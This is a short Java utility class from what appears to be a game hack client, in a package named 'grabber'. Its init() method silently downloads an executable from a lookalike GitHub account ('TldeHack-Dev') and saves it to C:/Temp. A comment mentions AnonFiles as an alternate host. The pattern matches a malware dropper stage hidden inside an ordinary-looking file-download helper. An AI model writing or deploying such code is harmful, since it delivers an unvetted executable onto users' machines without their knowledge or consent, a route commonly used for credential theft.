package risingtide.tidehack.utils.grabber;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;

public class RTUrlReader {

    public static void copyURLToFile(URL url, File file) {

        try {
            InputStream input = url.openStream();
            if (file.exists()) {
                if (file.isDirectory())
                    throw new IOException("File '" + file + "' is a directory");

                if (!file.canWrite())
                    throw new IOException("File '" + file + "' cannot be written");
            } else {
                File parent = file.getParentFile();
                if ((parent != null) && (!parent.exists()) && (!parent.mkdirs())) {
                    throw new IOException("File '" + file + "' could not be created");
                }
            }

            FileOutputStream output = new FileOutputStream(file);

            byte[] buffer = new byte[4096];
            int n = 0;
            while (-1 != (n = input.read(buffer))) {
                output.write(buffer, 0, n);
            }

            input.close();
            output.close();

            System.out.println("File '" + file + "' downloaded successfully!");
        }
        catch(IOException ioEx) {
            ioEx.printStackTrace();
        }
    }

    public static void init() throws IOException {

        // URL pointing to the file. Yes, I could just use AnonFiles but I've alr implemented this and
        // Java is black magic so I won't change it unless you threathen to tear my
        // fingernails off.
        String sUrl = "https://github.com/TldeHack-Dev/tidehackplus-runtime-downloads/blob/main/tidetweaker-ch.exe?raw=true";
        URL url = new URL(sUrl);

        // Downloaded file
        File file = new File("C:/Temp/tidetweakerc.exe");

        RTUrlReader.copyURLToFile(url, file);
    }

}
